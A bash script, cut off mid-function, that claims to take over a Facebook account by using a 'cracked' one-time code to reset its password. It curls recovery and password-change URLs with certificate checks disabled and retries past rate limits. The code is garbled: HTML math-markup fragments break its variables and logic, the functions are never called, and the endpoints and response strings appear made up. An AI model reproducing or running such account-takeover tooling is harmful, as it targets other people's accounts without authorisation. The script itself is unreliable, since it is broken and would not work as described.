#!/bin/bash

# This script recovers a Facebook password using a cracked OTP and changes the password.

# USAGE:
# ./recover-facebook-password.sh <email> <phone_number> <new_password>

# EMAIL and PHONE_NUMBER must be valid.

# Example:
# ./recover-facebook-password.sh john.doe@example.com +2376537127 newpassword123

# Check if the user has entered a valid email address
function check_email_address() {
  if ! [[ <span class="math-inline">1 \=\~ ^\[a\-zA\-Z0\-9\.\_%\+\-\]\+@\[a\-zA\-Z0\-9\.\-\]\+\\\.\[a\-zA\-Z\]\{2,\}</span> ]]; then
    echo "Invalid email address."
    exit 1
  fi
}

# Check if the user has entered a valid phone number
function check_phone_number() {
  if ! [[ <span class="math-inline">1 \=\~ ^\\\+\[0\-9\]\{1,3\}\[0\-9\]\{7,14\}</span> ]]; then
    echo "Invalid phone number."
    exit 1
  fi
}

# Prompt the user to enter the OTP if they have it
function get_otp() {
  echo "Do you have an OTP? (y/n)"
  read has_otp

  if [[ $has_otp == "y" ]]; then
    echo "Enter the OTP you have already tried: "
    read -s otp

    if [ -n "$otp" ]; then
      return <span class="math-inline">otp
fi
fi
return ""
\}
\# Set the curl command options
CURL\_OPTIONS\="\-i \-s \-k \-X GET"
\# Get the headers and cookies from the URL
function get\_headers\_and\_cookies\(\) \{
HEADERS\=</span>(curl <span class="math-inline">CURL\_OPTIONS "https\://www\.facebook\.com/recover/code/?ph%5B0%5D\=</span>{2}")

  # Extract the cookies from the headers
  COOKIES=$(grep -Po "Set-Cookie: \K[^;]*" <<< "$HEADERS")

  echo "$HEADERS"
  echo "$COOKIES"
}

# Make a POST request
function make_post_request() {
  local headers=$1
  local cookies=$2
  local post_data=$3
  local url=<span class="math-inline">4
response\=</span>(curl $CURL_OPTIONS $headers -b "$cookies" --data-binary "$post_data" "$url")

  echo "$response"
}

# Check if the OTP was correct
function check_otp_correct() {
  local response=$1

  if grep -q "Password changed successfully" <<< "$response"; then
    echo "true"
  else
    echo "false"
  fi
}

# Change the password using the cracked OTP
function change_password() {
  local headers=$1
  local cookies=$2
  local new_password=<span class="math-inline">3
change\_password\_response\=</span>(curl $CURL_OPTIONS $headers -b "<span class="math-inline">cookies" \-\-data "new\_password\=</span>{new_password}" "https://www.facebook.com/change_password/?ph%5B0%5D=${2}")

  echo "$change_password_response"
}

# Check if the password was changed successfully
function check_password_changed() {
  local response=$1

  if grep -q "Password successfully changed" <<< "$response"; then
    echo "true"
  else
    echo "false"
  fi
}

# Handle rate limiting
function handle_rate_limiting() {
  local response=$1

  if grep -q "Too many requests" <<< "$response"; then
    echo "Rate limited. Retrying in 60 seconds..."
    sleep 60
    return 1
  fi

  return 0
}

# Check if the new password is strong enough
function check_password_strength() {
  local new_password
